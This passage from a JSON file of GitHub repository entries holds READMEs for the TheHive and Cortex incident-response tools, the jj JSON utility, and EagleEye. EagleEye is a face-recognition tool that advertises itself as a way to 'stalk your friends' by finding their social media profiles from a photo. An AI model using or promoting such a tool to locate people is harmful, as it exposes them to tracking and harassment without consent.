account](https://twitter.com/thehive_project) and on [the blog](https://blog.thehive-project.org/).\\n\\n# Contributing\\nWe welcome your contributions, **[particularly new analyzers](https://github.com/TheHive-Project/CortexDocs/blob/master/api/how-to-create-an-analyzer.md)**\\nthat can take away the load off overworked fellow analysts. Please feel free \\nto fork the code, play with it, make some patches and send us pull requests \\nusing [issues](https://github.com/TheHive-Project/Cortex/issues).\\n\\nWe do have a [Code of conduct](code_of_conduct.md). Make sure to check it out before contributing.\\n\\n# Support\\nPlease [open an issue on GitHub](https://github.com/TheHive-Project/Cortex/issues) if you'd like to report a bug or request a feature.\\n\\n**Important Note**: if you encounter an issue with an analyzer or would like to\\nrequest a new one or an improvement to an existing analyzer, please open an\\nissue on the [analyzers' dedicated GitHub repository](https://github.com/TheHive-Project/cortex-analyzers/issues/new).\\nIf you have problems with TheHive or would like to request a TheHive-related\\nfeature, please [open an issue on its dedicated GitHub repository](https://github.com/TheHive-Project/TheHive/issues/new).\\n\\nAlternatively, if you need to contact the project team, send an email to <support@thehive-project.org>.\\n\\n# Community Discussions\\nWe have set up a Google forum at <https://groups.google.com/a/thehive-project.org/d/forum/users>. To request access, you need a Google account. You may create one [using a Gmail address](https://accounts.google.com/SignUp?hl=en) or [without one](https://accounts.google.com/SignUpWithoutGmail?hl=en).\\n\\n# Website\\n<https://thehive-project.org/>\\n\"", "topics": ["response", "rest", "python", "forensics", "iocs", "thehive", "analyzer", "api", "observable", "analysis", "engine", "free"], "writeup": "Cortex tries to solve a common problem frequently encountered by SOCs, CSIRTs and security researchers  in the course of threat intelligence, digital forensics and incident response: how to analyze observables they have collected, at scale, by querying a single tool instead of several?\n", "ignoredescription": false, "id": 95, "full_name": "TheHive-Project/Cortex", "url": "https://github.com/TheHive-Project/Cortex", "topic_string": "response rest python forensics iocs thehive analyzer api observable analysis engine free"},
{"tags": [], "owner": "TheHive-Project", "description": "TheHive: a Scalable, Open Source and Free Security Incident Response Platform", "name": "TheHive", "topics_string": "", "language": "JavaScript", "readme": "\"![](images/thehive-logo.png)\\n\\n\\n[![Join the chat at https://gitter.im/TheHive-Project/TheHive](https://badges.gitter.im/TheHive-Project/TheHive.svg)](https://gitter.im/TheHive-Project/TheHive?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)\\n\\n\\n[TheHive](https://thehive-project.org/) is a scalable 4-in-1 open source and free Security Incident Response Platform designed to make life easier for SOCs, CSIRTs, CERTs and any information security practitioner dealing with security incidents that need to be investigated and acted upon swiftly. It is the perfect companion for [MISP](http://www.misp-project.org/). You can synchronize it with one or multiple MISP instances to start investigations out of MISP events. You can also export an investigation's results as a MISP event to help your peers and partners detect and react to attacks you've dealt with. Additionally, when TheHive is used in conjunction with [Cortex](https://github.com/TheHive-Project/Cortex/), security analysts and researchers can easily analyze hundred of observables at once using more than 100 analyzers, contain an incident or eradicate malware thanks to Cortex responders.\\n\\n![Current Cases View](images/Current_cases.png)\\n\\n## Collaborate\\nCollaboration is at the heart of TheHive. Multiple analysts can work on the same case simultaneously. For example, an analyst may deal with malware analysis while another may work on tracking C2 beaconing activity on proxy logs as soon as IOCs have been added by their coworker. Using TheHive's live stream, everyone can keep an eye on what's happening on the platform, in real time.\\n\\n## Elaborate\\nWithin TheHive, every investigation corresponds to a case. Cases can be created from scratch or from [MISP](http://www.misp-project.org/) events, SIEM alerts, email reports and any other noteworthy source of security events.\\n\\nEach case can be broken down into one or more tasks. Instead of adding the same tasks to a given type of case every time one is created, analysts can use TheHive's template engine to create them once and for all. Case templates can also be used to associate metrics to specific case types in order to drive the team's activity, identify the type of investigations that take significant time and seek to automate tedious tasks.\\n\\nEach task can be assigned to a given analyst. Team members can also take charge of a task without waiting for someone to assign it to them.\\n\\nTasks may contain multiple work logs that contributing analysts can use to describe what they are up to, what was the outcome, attach pieces of evidence or noteworthy files and so on. Logs can be written using a rich text editor or Markdown.\\n\\n## Analyze\\nYou can add one or thousands of observables to each case you create. You can also create a case out of a [MISP](http://www.misp-project.org/) event. TheHive can be very easily linked to one or several MISP instances and MISP events can be previewed to decide whether they warrant an investigation or not. If an investigation is in order, the analyst can then add the event to an existing case or import it as a new case using a customizable template.\\n\\nThanks to [TheHive4py](https://thehive-project.org/#section_thehive4py), TheHive's Python API client, it is possible to send SIEM alerts, phishing and other suspicious emails and other security events to TheHive. They will appear in its `Alerts` panel along with new or updated MISP events, where they can be previewed, imported into cases or ignored.\\n\\n![The Alerts Pane](images/Alerts_Panel.png)\\n\\nTheHive has the ability to automatically identify observables that have been already seen in previous cases. Observables can also be associated with a [TLP](https://www.us-cert.gov/tlp) and a [PAP](https://www.misp-project.org/taxonomies.html#_pap) and the source which provided or generated them using tags. The analyst can also easily mark observables as IOCs and isolate those using a search query then export them for searching in a SIEM or other data stores.\\n\\nAnalysts can analyze hundreds of observables in a few clicks by leveraging more than a hundred analyzers of one or several [Cortex](https://github.com/TheHive-Project/Cortex/) instances depending on your OPSEC needs: DomainTools, VirusTotal, PassiveTotal, Joe Sandbox, geolocation, threat feed lookups and so on.\\n\\nSecurity analysts with a knack for scripting can easily add their own analyzers to Cortex in order to automate actions that must be performed on observables or IOCs. They can also decide how analyzers behave according to the TLP. For example, a file added as observable can be submitted to VirusTotal if the associated TLP is WHITE or GREEN. If it's AMBER, its hash is computed and submitted to VT but not the file. If it's RED, no VT lookup is done.\\n\\n## Respond\\nAnalysts can leverage Cortex responders to contain an incident, eradicate malware and perform other orchestration tasks. For example, they can call a responder to reply to a suspicious email notification from TheHive, block a URL at the proxy level or gather evidence from a compromised endpoint.\\n\\n# Try it\\nTo try TheHive, you can use the [training VM](https://github.com/TheHive-Project/TheHiveDocs/blob/master/training-material.md) or install it by reading the [Installation Guide](https://github.com/TheHive-Project/TheHiveDocs/blob/master/installation/install-guide.md).\\n\\n# Details\\n\\n## Documentation\\nWe have made several guides available in the [Documentation repository](https://github.com/TheHive-Project/TheHiveDocs).\\n\\n## Architecture\\nTheHive is written in Scala and uses ElasticSearch 5.x for storage. Its REST API is stateless which allows it to be horizontally scalable. The front-end uses AngularJS with Bootstrap.\\n\\n![architecture](images/thehive-architecture.png)\\n\\n## Workflow\\nThe following image shows a typical workflow:\\n\\n![workflow](images/thehive-workflow.png)\\n\\n## Additional features\\n### Authentication\\nTheHive supports several authentication methods:\\n+ Active Directory\\n+ LDAP\\n+ API keys\\n+ X.509 SSO\\n+ OAuth 2\\n+ Local authentication\\n\\n### Dashboards\\nTheHive comes with a powerful, highly configurable module that allows you to create meaningful dashboards to drive your activity and support your budget requests.\\n\\n### Case Merging\\nTwo (or more) cases can be easily merged together if you believe they relate to the same threat or have a significant observable overlap.\\n\\n### Case and Observable Filtering\\nYou can filter cases and observables very easily to show only the data that is of interest to you.\\n\\n### MISP and Cortex\\nTheHive can be configured to import events from one or multiple [MISP](http://www.misp-project.org/) instances using various filters (tag whitelist, tag blacklist, organization blacklist, max attributes per event...). You can also use TheHive to export cases as MISP events to one or several MISP servers. \\n\\n[Cortex](https://github.com/TheHive-Project/Cortex/) is the perfect companion for TheHive. Use one or several to analyze observables at scale and respond to incidents.\\n\\n### Alert Feeders by TheHive Project\\n\\n#### DigitalShadows2TH\\n[DigitalShadows2TH](https://github.com/TheHive-Project/DigitalShadows2TH) is a free, open source [Digital Shadows](https://www.digitalshadows.com/) alert feeder for TheHive. You can use it to import Digital Shadows *incidents* and *intel-incidents* as alerts in TheHive, where they can be previewed and transformed into new cases using pre-defined incident response templates or added into existing ones.\\n\\n#### Synapse\\n[Synapse](https://github.com/TheHive-Project/Synapse) is a meta-alert feeder that allows you to centrally feed TheHive from multiple alert sources. It leverages TheHive's API to automate case and alert creation. Case creation from email or alert creation from SIEM event are typical use cases. Currently, Synapse allows you to integrate Exchange, O365 & QRadar.\\n\\n#### Zerofox2TH\\n[Zerofox2TH](https://github.com/TheHive-Project/Zerofox2TH) is a free, open source [ZeroFOX](https://www.zerofox.com/) alert feeder for TheHive, written by TheHive Project. You can use it to feed ZeroFOX alerts into TheHive, where they can be previewed and transformed into new cases using pre-defined incident response templates or added into existing ones.\\n\\n### Alert Feeders from the User Community\\n\\n### Integration with Crowdstrike Falcon (WIP)\\n[Crowdstrike2TH](https://github.com/xg5-simon/CrowdStrike2TH) is a [Crowdstrike Falcon](https://www.crowdstrike.com/endpoint-security-products/) alert feeder for TheHive, written by [Simon](https://github.com/xg5-simon). You can use it to feed Crowdstrike alerts into TheHive, where they can be previewed and transformed into new cases using pre-defined incident response templates or added into existing ones.\\n\\n**Note**: this is a work in progress. Currently, the code licensing is unclear. \\n\\n### Integration with FireEye iSIGHT\\n[FireEye2TH](https://github.com/LDO-CERT/FireEye2TH) is a free, open source [FireEye iSIGHT](https://www.fireeye.com/) alert feeder for TheHive, written by LDO-CERT. You can use it to feed FireEye iSIGHT alerts into TheHive, where they can be previewed and transformed into new cases using pre-defined incident response templates or added into existing ones.\\n\\n# License\\nTheHive is an open source and free software released under the [AGPL](https://github.com/TheHive-Project/TheHive/blob/master/LICENSE) (Affero General Public License). We, TheHive Project, are committed to ensure that TheHive will remain a free and open source project on the long-run.\\n\\n# Updates\\nInformation, news and updates are regularly posted on [TheHive Project Twitter account](https://twitter.com/thehive_project) and on [the blog](https://blog.thehive-project.org/).\\n\\n# Contributing\\nPlease see our [Code of conduct](code_of_conduct.md). We welcome your contributions. Please feel free to fork the code, play with it, make some patches and send us pull requests via [issues](https://github.com/TheHive-Project/TheHive/issues).\\n\\n# Support\\nPlease [open an issue on GitHub](https://github.com/TheHive-Project/TheHive/issues) if you'd like to report a bug or request a feature. We are also available on [Gitter](https://gitter.im/TheHive-Project/TheHive) to help you out.\\n\\nIf you need to contact the project team, send an email to <support@thehive-project.org>.\\n\\n**Important Note**:\\n\\n- If you have problems with [TheHive4py](https://github.com/TheHive-Project/TheHive4py), please [open an issue on its dedicated repository](https://github.com/TheHive-Project/TheHive4py/issues/new).\\n- If you encounter an issue with Cortex or would like to request a Cortex-related feature, please [open an issue on its dedicated GitHub repository](https://github.com/TheHive-Project/Cortex/issues/new).\\n- If you have troubles with a Cortex analyzer or would like to request a new one or an improvement to an existing analyzer, please open an issue on the [analyzers' dedicated GitHub repository](https://github.com/TheHive-Project/cortex-analyzers/issues/new).\\n\\n# Community Discussions\\nWe have set up a Google forum at <https://groups.google.com/a/thehive-project.org/d/forum/users>. To request access, you need a Google account. You may create one [using a Gmail address](https://accounts.google.com/SignUp?hl=en) or [without it](https://accounts.google.com/SignUpWithoutGmail?hl=en).\\n\\n# Website\\n<https://thehive-project.org/>\\n\"", "topics": ["misp", "rest", "investigations", "scala", "orchestration", "forensics", "iocs", "agplv3", "analyzer", "api", "free", "cortex", "platform"], "writeup": "", "ignoredescription": false, "id": 96, "full_name": "TheHive-Project/TheHive", "url": "https://github.com/TheHive-Project/TheHive", "topic_string": "misp rest investigations scala orchestration forensics iocs agplv3 analyzer api free cortex platform"},
{"tags": [], "owner": "ThoughtfulDev", "description": "Stalk your Friends. Find their Instagram, FB and Twitter Profiles using Image Recognition and Reverse Image Search.", "name": "EagleEye", "topics_string": "", "language": "Python", "readme": "\"```\\r\\n$$$$$$$$\\\\ $$\\\\ $$$$$$$$\\\\ \\r\\n$$ _____| $$ | $$ _____| \\r\\n$$ | $$$$$$\\\\ $$$$$$\\\\ $$ | $$$$$$\\\\ $$ | $$\\\\ $$\\\\ $$$$$$\\\\ \\r\\n$$$$$\\\\ \\\\____$$\\\\ $$ __$$\\\\ $$ |$$ __$$\\\\ $$$$$\\\\ $$ | $$ |$$ __$$\\\\ \\r\\n$$ __| $$$$$$$ |$$ / $$ |$$ |$$$$$$$$ | $$ __| $$ | $$ |$$$$$$$$ |\\r\\n$$ | $$ __$$ |$$ | $$ |$$ |$$ ____| $$ | $$ | $$ |$$ ____|\\r\\n$$$$$$$$\\\\\\\\$$$$$$$ |\\\\$$$$$$$ |$$ |\\\\$$$$$$$\\\\ $$$$$$$$\\\\\\\\$$$$$$$ |\\\\$$$$$$$\\\\ \\r\\n\\\\________|\\\\_______| \\\\____$$ |\\\\__| \\\\_______| \\\\________|\\\\____$$ | \\\\_______|\\r\\n $$\\\\ $$ | $$\\\\ $$ | \\r\\n \\\\$$$$$$ | \\\\$$$$$$ | \\r\\n \\\\______/ \\\\______/ \\r\\n \\r\\n```\\r\\n\\r\\n<div align=\\\"center\\\">\\r\\n\\r\\n![Python 3.5](https://img.shields.io/badge/Python-3.6%2B-blue.svg)\\r\\n![OS Linux](https://img.shields.io/badge/Supported%20OS-Linux-yellow.svg)\\r\\n![Lets stalk](https://img.shields.io/badge/Stalkermode-Activated-red.svg)\\r\\n\\r\\n</div>\\r\\n\\r\\n---\\r\\n\\r\\n<p align=\\\"center\\\"> You have at least one image of the person you are looking for and a clue about their name. \\r\\n<br>\\r\\nYou enter this data into EagleEye and it tries to find Instagram, Youtube, Facebook, and Twitter Profiles of this person.\\r\\n <br> \\r\\n</p>\\r\\n\\r\\n## \\ud83d\\udcdd Table of Contents\\r\\n- [Getting Started](#getting_started)\\r\\n- [Usage](#usage)\\r\\n- [Built Using](#built_using)\\r\\n- [TODO](#todo)\\r\\n- [Authors](#authors)\\r\\n- [Acknowledgments](#acknowledgement)\\r\\n\\r\\n\\r\\n## \\ud83c\\udfc1 Getting Started <a name = \\\"getting_started\\\"></a>\\r\\nThese instructions will get you a copy of the project up and running on your local machine for development and testing purposes.\\r\\n\\r\\n### Prerequisites\\r\\n\\r\\n- A system with a x-server installed (Linux)\\r\\n- Firefox installed\\r\\n\\r\\n#### When using docker\\r\\n- Only docker is required\\r\\n\\r\\n#### When you dont use docker\\r\\n- Python 3.6 or higher\\r\\n- Pythons pip\\r\\n\\r\\n\\r\\n### Installing\\r\\n\\r\\n#### Docker (Preferred)\\r\\n**Make sure that you have docker installed**\\r\\n**Make sure that you use a LINUX distribution as the host**\\r\\n1. Clone the Repository\\r\\n\\r\\n ``` $ git clone https://github.com/ThoughtfulDev/EagleEye ```\\r\\n2. ```\\r\\n $ cd EagleEye\\r\\n $ sudo docker build -t eagle-eye .\\r\\n ```\\r\\n3. Now create a `known` folder and a `result` folder anywhere on your PC.\\r\\n4. Put the images of the known person in the known folder.\\r\\n5. Change the name of the person your are searching for in `entry.sh`\\r\\n6. Start the container. **Make sure to edit the paths**:\\r\\n```\\r\\nsudo docker run -t --net=host --env=\\\"DISPLAY\\\" \\\\\\r\\n --volume=\\\"$HOME/.Xauthority:/root/.Xauthority:rw\\\" \\\\\\r\\n -v /path/to/known:/EagleEye/known \\\\\\r\\n -v /path/to/result:/result \\\\\\r\\n -v /path/to/EagleEye/Repository/entry.sh:/entry.sh \\\\\\r\\n eagle-eye\\r\\n\\r\\n```\\r\\n\\r\\nThe result should now be in `/path/to/result`\\r\\n\\r\\n---\\r\\n\\r\\n#### Automated Prequisites Installation (If Docker doesn't work)\\r\\n```\\r\\nwget https://raw.githubusercontent.com/ThoughtfulDev/EagleEye/master/install.sh && chmod +x install.sh && ./install.sh\\r\\n```\\r\\n\\r\\n---\\r\\n\\r\\n#### Manual Prequisites Installation (If you are hardcore)\\r\\n\\r\\nFor **Debian** based Distros\\r\\n```\\r\\n$ sudo apt update && sudo apt upgrade -y\\r\\n$ sudo apt install git python3 python3-pip python3-dev\\r\\n$ sudo apt install libgtk-3-dev libboost-all-dev build-essential cmake libffi-dev\\r\\n$ git clone https://github.com/ThoughtfulDev/EagleEye\\r\\n$ cd EagleEye && sudo pip3 install -r requirements.txt\\r\\n$ sudo pip3 install --upgrade beautifulsoup4 html5lib spry\\r\\n```\\r\\n\\r\\nFor **Arch**\\r\\n```\\r\\n$ sudo pacman -Syu\\r\\n$ sudo pacman -S git python python-pip gtk3 boost cmake libffi\\r\\n$ git clone https://github.com/ThoughtfulDev/EagleEye\\r\\n$ cd EagleEye && sudo pip3 install -r requirements.txt\\r\\n$ sudo pip3 install --upgrade beautifulsoup4 html5lib spry\\r\\n```\\r\\n\\r\\n\\r\\nIf Firefox is installed, download the [latest release](https://github.com/mozilla/geckodriver/releases/latest) of the Geckodriver for you Architecture.\\r\\n\\r\\n**If you get a `broken pipe` Error use Geckodriver Version 0.19.1.**\\r\\n\\r\\n**Note: If you are using Firefox ESR (like Kali does) please use the Geckodriver Version 0.17.**\\r\\n\\r\\nMake the Geckodriver executable:\\r\\n```\\r\\n$ chmod +x /path/to/geckodriver\\r\\n```\\r\\n\\r\\nNote: The `geckodriver` prefers to be in your path so wherever you do set it up you will likely need to setup a link to somewhere in your PATH (or add it to your PATH).\\r\\n\\r\\nExample:\\r\\n```\\r\\n$ sudo ln -s /path/to/geckodriver /usr/local/bin/geckodriver\\r\\n```\\r\\n\\r\\n\\r\\n## \\ud83c\\udf88 Usage <a name=\\\"usage\\\"></a>\\r\\n\\r\\n### Configuration: General\\r\\n\\r\\nChange the value in `config.json` to the path of the `geckodriver` e.g\\r\\n```\\r\\n{\\r\\n \\\"DEFAULTS\\\": {\\r\\n ...\\r\\n },\\r\\n \\\"WEBDRIVER\\\": {\\r\\n \\\"ENGINE\\\": \\\"firefox\\\",\\r\\n \\\"PATH\\\": \\\"/usr/local/bin/geckodriver\\\"\\r\\n },\\r\\n \\\"FILTER\\\": [\\r\\n ....\\r\\n ],\\r\\n ...\\r\\n}\\r\\n```\\r\\n\\r\\n### Configuration: Images\\r\\n\\r\\nPut at least one Image of the Person you want to find in the `known` folder.\\r\\n\\r\\nSupported Filetypes are: **jpg/JPG, jpeg/JPEG, png/PNG, and bmp/BMP.**\\r\\n\\r\\n### Run\\r\\n\\r\\nThen run the program ;)\\r\\n```\\r\\n$ python3 eagle-eye.py\\r\\n```\\r\\n\\r\\nTo see a list of all available Options just type\\r\\n```\\r\\n$ python3 eagle-eye.py -h\\r\\n```\\r\\n\\r\\n*The ImageRaider Reverse Image Search can take some minutes 1-15 Minutes depending on the count of Images*\\r\\n\\r\\n\\r\\n## TODO <a name = \\\"todo\\\"></a>\\r\\n* Implement the Chrome Webdriver\\r\\n\\r\\n## \\u26cf\\ufe0f Built Using <a name = \\\"built_using\\\"></a>\\r\\n- [Python](https://www.python.org/) - Language\\r\\n- [dlib](http://dlib.net/) - Face detection\\r\\n- [face_recognition](https://github.com/ageitgey/face_recognition) - dlib python api\\r\\n- [Selenium](https://www.seleniumhq.org/) - WebBrowser automation\\r\\n\\r\\n## \\u270d\\ufe0f Authors <a name = \\\"authors\\\"></a>\\r\\n- [@ThoughtfulDev](https://github.com/ThoughtfulDev) - Idea & Work\\r\\n\\r\\n## \\ud83c\\udf89 Acknowledgements <a name = \\\"acknowledgement\\\"></a>\\r\\n- The movie Eagle Eye\\r\\n\"", "topics": ["osint", "machine-learning", "social-media", "face-recognition", "stalking"], "writeup": "", "ignoredescription": false, "id": 97, "full_name": "ThoughtfulDev/EagleEye", "url": "https://github.com/ThoughtfulDev/EagleEye", "topic_string": "osint machine-learning social-media face-recognition stalking"},
{"tags": [], "owner": "tidwall", "description": "JSON Stream Editor (command line utility)", "name": "jj", "topics_string": "", "language": "Go", "readme": "\"<p align=\\\"center\\\">\\n<img \\n src=\\\"logo.png\\\" \\n width=\\\"108\\\" height=\\\"78\\\" border=\\\"0\\\" alt=\\\"JJ\\\">\\n<br>\\nJSON Stream Editor\\n</p>\\n\\nJJ is a command line utility that provides a [fast](#performance) and simple way to retrieve or update values from JSON documents.\\nIt's powered by [GJSON](https://github.com/tidwall/gjson) and [SJSON](https://github.com/tidwall/sjson) under the hood. \\n\\nIt's [fast](#performance) because it avoids parsing irrelevant sections of json, skipping over values that do not apply, and aborts as soon as the target value has been found or updated.\\n\\nGetting started\\n---------------\\n\\n## Install\\n\\n### Mac (Homebrew)\\n\\n```\\nbrew install tidwall/jj/jj\\n```\\n\\n### Build\\n\\n```\\nmake\\n```\\n\\nOr [download a pre-built binary](https://github.com/tidwall/jj/releases) for Linux, OSX, Windows, or FreeBSD.\\n\\n\\n### Usage\\n\\n```\\n$ jj -h\\n\\nusage: jj [-v value] [-purOD] [-i infile] [-o outfile] keypath\\n\\nexamples: jj keypath read value from stdin\\n or: jj -i infile keypath read value from infile\\n or: jj -v value keypath edit value\\n or: jj -v value -o outfile keypath edit value and write to outfile\\n\\noptions:\\n -v value Edit JSON key path value\\n -p Make json pretty, keypath is optional\\n -u Make json ugly, keypath is optional\\n -r Use raw values, otherwise types are auto-detected\\n -n Do not output color or extra formatting\\n -O Performance boost for value updates\\n -D Delete the value at the specified key path\\n -l Output array values on multiple lines\\n -i infile Use input file instead of stdin\\n -o outfile Use output file instead of stdout\\n keypath JSON key path (like \\\"name.last\\\")\\n```\\n\\n\\nExamples\\n--------\\n\\n### Getting a value \\n\\nJJ uses a [path syntax](https://github.com/tidwall/gjson#path-syntax) for finding values. \\n\\nGet a string:\\n```sh\\n$ echo '{\\\"name\\\":{\\\"first\\\":\\\"Tom\\\",\\\"last\\\":\\\"Smith\\\"}}' | jj name.last\\nSmith\\n```\\n\\nGet a block of JSON:\\n```sh\\n$ echo '{\\\"name\\\":{\\\"first\\\":\\\"Tom\\\",\\\"last\\\":\\\"Smith\\\"}}' | jj name\\n{\\\"first\\\":\\\"Tom\\\",\\\"last\\\":\\\"Smith\\\"}\\n```\\n\\nTry to get a non-existent key:\\n```sh\\n$ echo '{\\\"name\\\":{\\\"first\\\":\\\"Tom\\\",\\\"last\\\":\\\"Smith\\\"}}' | jj name.middle\\nnull\\n```\\n\\nGet the raw string value:\\n```sh\\n$ echo '{\\\"name\\\":{\\\"first\\\":\\\"Tom\\\",\\\"last\\\":\\\"Smith\\\"}}' | jj -r name.last\\n\\\"Smith\\\"\\n```\\n\\nGet an array value by index:\\n```sh\\n$ echo '{\\\"friends\\\":[\\\"Tom\\\",\\\"Jane\\\",\\\"Carol\\\"]}' | jj friends.1\\nJane\\n```\\n\\n## JSON Lines\\n\\nThere's support for [JSON Lines](http://jsonlines.org/) using the `..` path prefix.\\nWhich when specified, treats the multi-lined document as an array. \\n\\nFor example:\\n\\n```\\n{\\\"name\\\": \\\"Gilbert\\\", \\\"age\\\": 61}\\n{\\\"name\\\": \\\"Alexa\\\", \\\"age\\\": 34}\\n{\\\"name\\\": \\\"May\\\", \\\"age\\\": 57}\\n```\\n\\n```\\n..# >> 4\\n..1 >> {\\\"name\\\": \\\"Alexa\\\", \\\"age\\\": 34}\\n..#.name >> [\\\"Gilbert\\\",\\\"Alexa\\\",\\\"May\\\"]\\n..#[name=\\\"May\\\"].age >> 57\\n```\\n\\n### Setting a value\\n\\nThe [path syntax](https://github.com/tidwall/sjson#path-syntax) for setting values has a couple of tiny differences than for getting values.\\n\\nThe `-v value` option is auto-detected as a Number, Boolean, Null, or String. \\nYou can override the auto-detection and input raw JSON by including the `-r` option.\\nThis is useful for raw JSON blocks such as object, arrays, or premarshalled strings.\\n\\nUpdate a value:\\n```sh\\n$ echo '{\\\"name\\\":{\\\"first\\\":\\\"Tom\\\",\\\"last\\\":\\\"Smith\\\"}}' | jj -v Andy name.first\\n{\\\"name\\\":{\\\"first\\\":\\\"Andy\\\",\\\"last\\\":\\\"Smith\\\"}}\\n```\\n\\nSet a new value:\\n```sh\\n$ echo '{\\\"name\\\":{\\\"first\\\":\\\"Tom\\\",\\\"last\\\":\\\"Smith\\\"}}' | jj -v 46 age\\n{\\\"age\\\":46,\\\"name\\\":{\\\"first\\\":\\\"Tom\\\",\\\"last\\\":\\\"Smith\\\"}}\\n```\\n\\nSet a new nested value:\\n```sh\\n$ echo '{\\\"name\\\":{\\\"first\\\":\\\"Tom\\\",\\\"last\\\":\\\"Smith\\\"}}' | jj -v relax task.today\\n{\\\"task\\\":{\\\"today\\\":\\\"relax\\\"},\\\"name\\\":{\\\"first\\\":\\\"Tom\\\",\\\"last\\\":\\\"Smith\\\"}}\\n```\\n\\nReplace an array value by index:\\n```sh\\n$ echo '{\\\"friends\\\":[\\\"Tom\\\",\\\"Jane\\\",\\\"Carol\\\"]}' | jj -v Andy friends.1\\n{\\\"friends\\\":[\\\"Tom\\\",\\\"Andy\\\",\\\"Carol\\\"]}\\n```\\n\\nAppend an array:\\n```sh\\n$ echo '{\\\"friends\\\":[\\\"Tom\\\",\\\"Jane\\\",\\\"Carol\\\"]}' | jj -v Andy friends.-1\\n{\\\"friends\\\":[\\\"Tom\\\",\\\"Andy\\\",\\\"Carol\\\",\\\"Andy\\\"]}\\n```\\n\\nSet an array value that's past the bounds:\\n```sh\\n$ echo '{\\\"friends\\\":[\\\"Tom\\\",\\\"Jane\\\",\\\"Carol\\\"]}' | jj -v Andy friends.5\\n{\\\"friends\\\":[\\\"Tom\\\",\\\"Andy\\\",\\\"Carol\\\",null,null,\\\"Andy\\\"]}\\n```\\n\\nSet a raw block of JSON:\\n```sh\\n$ echo '{\\\"name\\\":\\\"Carol\\\"}' | jj -r -v '[\\\"Tom\\\",\\\"Andy\\\"]' friends\\n{\\\"friends\\\":[\\\"Tom\\\",\\\"Andy\\\"],\\\"name\\\":\\\"Carol\\\"}\\n```\\n\\nStart new JSON document:\\n```sh\\n$ echo '' | jj -v 'Sam' name.first\\n{\\\"name\\\":{\\\"first\\\":\\\"Sam\\\"}}\\n```\\n\\n### Deleting a value\\n\\nDelete a value:\\n```sh\\n$ echo '{\\\"age\\\":46,\\\"name\\\":{\\\"first\\\":\\\"Tom\\\",\\\"last\\\":\\\"Smith\\\"}}' | jj -D age\\n{\\\"name\\\":{\\\"first\\\":\\\"Tom\\\",\\\"last\\\":\\\"Smith\\\"}}\\n```\\n\\nDelete an array value by index:\\n```sh\\n$ echo '{\\\"friends\\\":[\\\"Andy\\\",\\\"Carol\\\"]}' | jj -D friends.0\\n{\\\"friends\\\":[\\\"Carol\\\"]}\\n```\\n\\nDelete last item in array:\\n```sh\\n$ echo '{\\\"friends\\\":[\\\"Andy\\\",\\\"Carol\\\"]}' | jj -D friends.-1\\n{\\\"friends\\\":[\\\"Andy\\\"]}\\n```\\n\\n### Optimistically update a value\\n\\nThe `-O` option can be used when the caller expects that a value at the\\nspecified keypath already exists.\\n\\nUsing this option can speed up an operation by as much as 6x, but\\nslow down as much as 20% when the value does not exist.\\n\\nFor example:\\n\\n```\\necho '{\\\"name\\\":{\\\"first\\\":\\\"Tom\\\",\\\"last\\\":\\\"Smith\\\"}}' | jj -v Tim -O name.first\\n```\\n\\nThe `-O` tells jj that the `name.first` likely exists so try a fasttrack operation first.\\n\\n## Pretty printing\\n\\nThe `-p` flag will make the output json pretty.\\n\\n```\\n$ echo '{\\\"name\\\":{\\\"first\\\":\\\"Tom\\\",\\\"last\\\":\\\"Smith\\\"}}' | jj -p name\\n{\\n \\\"first\\\": \\\"Tom\\\",\\n \\\"last\\\": \\\"Smith\\\"\\n}\\n```\\n\\nAlso the keypath is optional when the `-p` flag is specified, allowing for the entire json document to be made pretty.\\n\\n```\\n$ echo '{\\\"name\\\":{\\\"first\\\":\\\"Tom\\\",\\\"last\\\":\\\"Smith\\\"}}' | jj -p\\n{\\n \\\"name\\\": {\\n \\\"first\\\": \\\"Tom\\\",\\n \\\"last\\\": \\\"Smith\\\"\\n }\\n}\\n```\\n\\n## Ugly printing\\n\\nThe `-u` flag will compress the json into the fewest characters possible by squashing newlines and spaces.\\n\\n\\n## Performance\\n\\nA quick comparison of jj to [jq](https://stedolan.github.io/jq/). The test [json file](https://github.com/tidwall/sf-city-lots-json) is 180MB file of 206,560 city parcels in San Francisco.\\n\\n*Tested on a 2015 Macbook Pro running jq 1.5 and jj 1.0.0*\\n\\n#### Get the lot number for the parcel at index 10000\\n\\njq:\\n\\n```bash\\n$ time cat citylots.json | jq -cM .features[10000].properties.LOT_NUM\\n\\\"091\\\"\\n\\nreal 0m5.486s\\nuser 0m4.870s\\nsys 0m0.686s\\n```\\n\\njj:\\n\\n```bash\\n$ time cat citylots.json | jj -r features.10000.properties.LOT_NUM\\n\\\"091\\\"\\n\\nreal 0m0.354s\\nuser 0m0.161s\\nsys 0m0.321s\\n```\\n\\n#### Update the lot number for the parcel at index 10000\\n\\njq:\\n\\n```bash\\n$ time cat citylots.json | jq -cM '.features[10000].properties.LOT_NUM=\\\"12A\\\"' > /dev/null\\n\\nreal 0m13.579s\\nuser 0m16.484s\\nsys 0m1.310s\\n```\\n\\njj:\\n\\n```bash\\n$ time cat citylots.json | jj -O -v 12A features.10000.properties.LOT_NUM > /dev/null\\n\\nreal 0m0.431s\\nuser\\t0m0.201s\\nsys 0m0.295s\\n```\\n\\n## Contact\\nJosh Baker [@tidwall](http://twitter.com/tidwall)\\n\\n## License\\nJJ source code is available under the MIT [License](/LICENSE).\\n\\n\\n\\n\"", "topics": ["utility", "cli", "json"], "writeup": "A nifty command line tool for querying JSON data. Written in Golang so super easy to set up and use. Runs on an underlying library tidwall/gjson which is useful.\n", "ignoredescription": false, "id": 98, "full_name": "tidwall/jj", "url": "https://github.com/tidwall/jj", "topic_string": "utility cli json"},
